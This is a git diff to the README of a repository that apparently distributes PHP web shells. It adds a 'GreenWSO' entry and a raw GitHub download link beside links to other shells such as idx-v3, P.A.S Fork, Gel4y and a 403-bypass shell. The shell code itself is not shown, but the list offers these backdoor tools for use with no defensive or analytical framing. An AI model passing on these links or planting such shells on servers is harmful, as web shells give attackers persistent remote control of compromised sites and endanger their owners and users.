@@ -1,12 +1,13 @@
-<img align="center" src="https://media.tenor.com/OP1bGPSk940AAAAC/anime-i-will-hack-into-your-heart.gif" />
-  
+<img align="center" src="https://media.tenor.com/OP1bGPSk940AAAAC/anime-i-will-hack-into-your-heart.gif"/>
 <br>
 
 # weebspace
 * shell list
+```
+v3
+```
 
-
-
+* GreenWSO [gw]
 * idx-v3 shell [idx]
 * P.A.S Fork [PaS]
 * Gel4y shell [g4y]
@@ -19,6 +20,7 @@
 * Ngiiix1337 priv8 Shell [PRIV]
 
 
+[gw]: https://raw.githubusercontent.com/liiuxii/zxc/main/gw.php
 [idx]: https://raw.githubusercontent.com/liiuxii/zxc/main/shell-v3.php
 [PaS]: https://raw.githubusercontent.com/liiuxii/zxc/main/pas_fork.php
 [g4y]: https://raw.githubusercontent.com/liiuxii/zxc/main/bypass403.php
